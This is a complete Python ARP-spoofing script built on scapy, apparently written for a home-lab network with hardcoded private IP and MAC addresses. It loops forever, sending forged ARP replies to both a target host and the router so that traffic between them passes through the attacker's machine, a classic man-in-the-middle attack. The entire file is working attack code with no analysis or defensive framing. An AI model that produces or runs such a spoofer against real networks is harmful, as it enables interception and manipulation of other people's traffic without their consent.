#/usr/bin/env python
# Rebuild
from scapy.layers.l2 import ARP, Ether, getmacbyip
import scapy.all as scapy
import time
import sys
from utils.arp_spoof_utils import check_port_forwarding

target_interface_1 = "192.168.63.174"
target_interface_2 = "192.168.63.177"
target_mac_1 = "00:0c:29:3a:62:c0"
router_ip = "192.168.63.2"
router_mac = "00-0c-29-fe-37-29"
my_ip = "192.168.63.139"

check_port_forwarding()
def spoof(target_ip, spoof_ip):
	target_mac = getmacbyip(target_ip)
	# pkt1 = ARP(op="is-at", psrc=router_ip, hwsrc=router_mac, pdst=victim_ip, hwdst=victim_mac)
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
	spoof(target_interface_1, router_ip)
	spoof(router_ip, target_interface_1)
	sent_packets_count = sent_packets_count + 2
	print("\r[+] Packets sent: " + str(sent_packets_count)),
	sys.stdout.flush()
	time.sleep(2)
